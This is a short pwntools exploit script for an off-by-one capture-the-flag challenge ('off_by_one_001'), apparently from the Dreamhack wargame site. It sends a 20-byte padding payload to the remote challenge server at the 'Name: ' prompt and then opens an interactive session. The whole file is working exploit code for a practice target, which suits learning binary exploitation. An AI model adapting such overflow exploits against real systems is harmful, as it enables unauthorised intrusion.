from pwn import *

exe = ELF('off_by_one_001', checksec=False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 13664)

payload = b'a'*(0x18 - 0x4)
r.sendafter(b'Name: ', payload)
r.interactive()